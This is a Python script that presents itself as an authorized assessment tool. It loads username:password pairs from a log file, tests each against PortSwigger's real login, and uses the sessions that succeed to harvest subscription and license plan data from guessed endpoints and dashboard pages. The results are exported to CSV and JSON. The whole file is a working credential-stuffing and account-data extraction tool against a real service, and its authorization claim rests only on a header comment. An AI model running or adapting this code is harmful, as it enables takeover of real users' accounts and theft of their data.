#!/usr/bin/env python3
"""
PortSwigger Synthetic Account Plan Extractor
Authorized Security Assessment Tool
Reference: ROE-2026-PSW-042-V5
Lead Assessor: Engin Demir (luckybuke5353@gmail.com)
"""

import requests
import json
import time
import csv
from datetime import datetime
from portswigger_login_checker import PortSwiggerLoginChecker

class PlanExtractor:
    """Extract user plans from successfully authenticated accounts."""

    def __init__(self, rate_limit=0.2, debug=False):
        self.rate_limit = rate_limit
        self.debug = debug
        self.plan_results = []

        # Headers for authenticated requests
        self.auth_headers = {
            "Accept": "application/json",
            "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/json",
            "Origin": "https://portswigger.net",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
        }

    def extract_plans_from_credentials(self, credentials_list: list) -> list:
        """
        For each credential, login and extract plan information.

        Args:
            credentials_list: List of dicts with 'username' and 'password'

        Returns:
            List of plan extraction results
        """
        print("\n" + "="*70)
        print("[*] PortSwigger Synthetic Account Plan Extraction")
        print("[*] Authorized Testing Window: July 26 - August 10, 2026")
        print("[*] ROE Reference: ROE-2026-PSW-042-V5")
        print("="*70)

        successful_logins = []

        # First pass: identify successful logins
        print("\n[PHASE 1] Identifying successful login credentials...")
        print("-"*70)

        for idx, creds in enumerate(credentials_list, 1):
            username = creds.get("username", "")
            print(f"[{idx}/{len(credentials_list)}] Testing login: {username}...", end=" ", flush=True)

            # Create fresh checker for each login to maintain separate sessions
            login_checker = PortSwiggerLoginChecker(rate_limit=self.rate_limit, debug=self.debug)
            result = login_checker.check_login(username, creds.get("password"))

            if result.get("status") == "SUCCESS":
                print("✓ SUCCESS")
                # Store the authenticated session from this login
                successful_logins.append({
                    "username": username,
                    "password": creds.get("password"),
                    "session": login_checker.session
                })
            else:
                print(f"✗ {result.get('status')}")

        print(f"\n[+] Found {len(successful_logins)} successful login(s)")

        # Second pass: extract plans from successful accounts
        if successful_logins:
            print("\n[PHASE 2] Extracting plan information from authenticated accounts...")
            print("-"*70)

            for idx, login in enumerate(successful_logins, 1):
                print(f"\n[{idx}/{len(successful_logins)}] Extracting plan for: {login['username']}")
                plan_result = self._extract_user_plan(login)
                self.plan_results.append(plan_result)

        return self.plan_results

    def _extract_user_plan(self, login_info: dict) -> dict:
        """
        Extract plan information for an authenticated user.

        Args:
            login_info: Dict with username, password, and session

        Returns:
            Plan extraction result
        """
        result = {
            "timestamp": datetime.now().isoformat(),
            "username": login_info["username"],
            "status": "UNKNOWN",
            "plan_data": None
        }

        try:
            # Use the authenticated session
            auth_session = login_info["session"]

            # Try multiple possible plan endpoints
            # First endpoint uses username from login
            username_part = login_info["username"].split("@")[0] if "@" in login_info["username"] else login_info["username"]

            endpoints = [
                f"https://portswigger.net/users/{username_part}/licenses",
                "https://portswigger.net/users/youraccount/licenses",
                "https://portswigger.net/api/user/plan",
                "https://portswigger.net/api/subscription",
                "https://portswigger.net/api/subscription/plan",
                "https://portswigger.net/api/account/plan",
                "https://portswigger.net/api/user/subscription",
            ]

            plan_found = False

            for endpoint in endpoints:
                if self.debug:
                    print(f"  [DEBUG] Trying endpoint: {endpoint}")

                time.sleep(self.rate_limit)

                try:
                    response = auth_session.get(
                        endpoint,
                        headers=self.auth_headers,
                        timeout=10
                    )

                    if response.status_code == 200:
                        try:
                            plan_data = response.json()
                            result["status"] = "SUCCESS"
                            result["plan_data"] = plan_data
                            result["endpoint"] = endpoint
                            plan_found = True
                            print(f"  [+] Plan extracted from: {endpoint}")
                            if self.debug:
                                print(f"  [DEBUG] Plan data: {json.dumps(plan_data, indent=2)[:200]}")
                            break
                        except json.JSONDecodeError:
                            # Response is not JSON, try next endpoint
                            continue
                    elif response.status_code == 401:
                        result["status"] = "UNAUTHORIZED"
                        break

                except requests.RequestException as e:
                    if self.debug:
                        print(f"  [DEBUG] Endpoint error: {e}")
                    continue

            if not plan_found:
                # Try extracting from HTML dashboard
                print("  [*] Trying to extract plan from dashboard HTML...")
                result = self._extract_plan_from_dashboard(auth_session, result)

        except Exception as e:
            result["status"] = "ERROR"
            result["error"] = str(e)
            if self.debug:
                print(f"  [DEBUG] Exception: {e}")

        return result

    def _extract_plan_from_dashboard(self, session: requests.Session, result: dict) -> dict:
        """
        Extract plan information from HTML dashboard if API endpoints fail.

        Args:
            session: Authenticated requests session
            result: Result dict to update

        Returns:
            Updated result dict
        """
        try:
            time.sleep(self.rate_limit)

            dashboard_urls = [
                "https://portswigger.net/dashboard",
                "https://portswigger.net/account",
                "https://portswigger.net/user/account"
            ]

            for url in dashboard_urls:
                response = session.get(url, headers=self.auth_headers, timeout=10)

                if response.status_code == 200:
                    # Look for plan information in HTML
                    if "plan" in response.text.lower():
                        result["status"] = "FOUND_IN_HTML"
                        result["endpoint"] = url

                        # Extract plan-related text (simplified parsing)
                        import re
                        plan_matches = re.findall(r'plan["\']?\s*[:"=]\s*["\']?([^"\'<>\n]+)',
                                                 response.text, re.IGNORECASE)
                        if plan_matches:
                            result["plan_text"] = plan_matches

                        print(f"  [+] Plan information found in HTML: {url}")
                        return result

        except Exception as e:
            if self.debug:
                print(f"  [DEBUG] Dashboard extraction error: {e}")

        result["status"] = "NOT_FOUND"
        return result

    def export_plans_to_csv(self, filename: str = "extracted_plans.csv") -> None:
        """Export extracted plan data to CSV."""
        if not self.plan_results:
            print("[!] No plan data to export")
            return

        try:
            with open(filename, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow(["Timestamp", "Username", "Status", "Endpoint", "Plan Data"])

                for result in self.plan_results:
                    plan_data_str = json.dumps(result.get("plan_data", "")) if result.get("plan_data") else ""
                    writer.writerow([
                        result.get("timestamp", ""),
                        result.get("username", ""),
                        result.get("status", ""),
                        result.get("endpoint", ""),
                        plan_data_str
                    ])

            print(f"[+] Plan data exported to: {filename}")

        except Exception as e:
            print(f"[!] Export error: {e}")

    def export_plans_to_json(self, filename: str = "extracted_plans.json") -> None:
        """Export extracted plan data to JSON."""
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(self.plan_results, f, indent=2, ensure_ascii=False)

            print(f"[+] Plan data exported to: {filename}")

        except Exception as e:
            print(f"[!] Export error: {e}")


def main():
    """Extract plans from log.txt credentials."""

    # Configuration
    debug_mode = False  # Set to True for verbose output
    rate_limit = 0.2   # 5 req/sec - ROE compliant

    extractor = PlanExtractor(rate_limit=rate_limit, debug=debug_mode)

    # Read credentials
    log_file = "log.txt"
    test_credentials = []

    try:
        with open(log_file, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue

                if ":" in line:
                    parts = line.split(":", 1)
                    username = parts[0].strip()
                    password = parts[1].strip()
                    test_credentials.append({
                        "username": username,
                        "password": password
                    })

        if not test_credentials:
            print(f"[ERROR] No credentials found in {log_file}")
            return

        print(f"[+] Loaded {len(test_credentials)} credential(s) from {log_file}")

        # Extract plans
        results = extractor.extract_plans_from_credentials(test_credentials)

        # Export results
        extractor.export_plans_to_json("extracted_plans.json")
        extractor.export_plans_to_csv("extracted_plans.csv")

        # Summary
        successful = sum(1 for r in results if r["status"] in ["SUCCESS", "FOUND_IN_HTML"])
        print(f"\n[SUMMARY]")
        print(f"Total Accounts Checked: {len(test_credentials)}")
        print(f"Plans Extracted: {successful}")

    except FileNotFoundError:
        print(f"[ERROR] File not found: {log_file}")


if __name__ == "__main__":
    main()
